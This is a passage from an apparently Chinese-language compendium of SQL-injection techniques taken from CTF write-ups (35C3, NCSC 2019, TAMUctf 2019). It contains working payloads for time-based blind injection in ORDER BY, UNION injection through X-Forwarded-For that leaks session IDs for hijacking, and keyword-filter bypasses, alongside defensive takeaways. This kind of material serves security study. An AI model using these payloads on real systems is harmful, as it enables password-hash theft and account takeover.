POST /cp/tbl_sort[0][]=(select if(substr(user_password,1,1)='a',sleep(5),0) from exp_members) tbl_sort[0][]=ASC
```

可把 `sleep()` / `benchmark()` 放进排序表达式中，对管理员密码哈希做时间盲注。

**关键点：** 任何允许客户端指定排序列的 ORM 都必须做 allowlist。这类攻击尤其隐蔽，因为很多 WAF 只盯 `SELECT`/`UNION`，很少关注 `ORDER BY` 子查询。

**参考：** 35C3 CTF 2018 — ExpressionEngine filemanager SQLi, writeup 12880

---

## SQLite UNION via X-Forwarded-For with PHPSESSID Oracle (NCSC 2019)

**模式：** 一个会话初始化逻辑会构造 `SELECT ... FROM nxf8_sessions WHERE ip_address = '<X-Forwarded-For>'`，并把结果行复制进 `PHPSESSID` cookie。UNION 出来的最后一列值会直接变成 cookie，相当于白送一个一次性回显通道。报错信息 `unrecognized token` 暴露后端是 SQLite，可进一步用 `sqlite_master` 枚举。

```bash
# Discover column count (4 columns in this table)
curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,null from nxf8_users where '1'='1"

# Leak table definitions from sqlite_master
curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,sql from sqlite_master where tbl_name='nxf8_users' and type='table"

# Exfiltrate a specific row (session_id for user 5)
curl -i http://target/ -H "X-Forwarded-For: pwnd' union select null,null,null,session_id from nxf8_sessions where user_id=5 and '1'='1"
# -> Set-Cookie: PHPSESSID=<leaked value>
```
用 `null` 补齐列数，把目标表达式放进会被 cookie 反射的那一列。随后把泄露出的 `session_id` 作为自己的 `PHPSESSID` 重放，即可冒充目标用户（例如 Maria）。

**关键点：** 会话 ID 初始化逻辑常会纳入未净化的 HTTP 头（`X-Forwarded-For`、`Client-IP`、`True-Client-IP`）。结果行一旦被反射到 cookie，就不再需要报错注入或时间盲注。SQLite 场景下记得用 `null` 补齐 UNION 列数，并通过 `sqlite_master(type,name,tbl_name,sql)` 枚举 schema，而不是 `information_schema`。

**参考：** Quals Saudi and Oman National Cyber Security CTF 2019 — Maria, writeup 13236

---

## Quote-Adjacent UNION Keyword Filter Bypass (TAMUctf 2019)

**模式：** 应用会拦截单词 `UNION`，但只是天真地查找 `" UNION "`（前后有空格）。SQL 词法分析器会把闭合引号视为 token 边界，因此 `'UNION` 在字符串结束后仍会被解析成关键字 `UNION`。把 `UNION` 紧贴闭合引号放置，就能绕过字符串过滤，同时仍被 SQL 解析器接受。

```sql
-- Original: SELECT items FROM Search WHERE items='<input>';
-- Blocked (filter sees " UNION "):
aggies' UNION SELECT 1; #

-- Bypass (no space before UNION — filter sees "UNION" embedded in word "aggies'UNION"):
aggies'UNION SELECT 1; #

-- Drop the string prefix entirely:
'UNION SELECT @@VERSION #
'UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_schema!='information_schema' #
'UNION ALL SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema!='information_schema' #
'UNION ALL SELECT grantee FROM information_schema.user_privileges #
```

**关键点：** 天真的黑名单只盯带空白分隔的关键字，但 SQL 词法允许关键字直接贴在引号边界后，闭合 `'` 对解析器而言等价于隐式空白。类似技巧也适用于 `/*!50000UNION*/`、制表/换行（`%09`、`%0a`）、括号（`UNION(SELECT...)`）和注释块（`UNION/**/SELECT`）。同时别忘了探测 `information_schema.user_privileges` 里的 `grantee` 字段，CTF 出题人常把 flag 藏在高权限用户名里。

**参考：** TAMUctf 2019 — Bird Box Challenge, writeup 13860

---
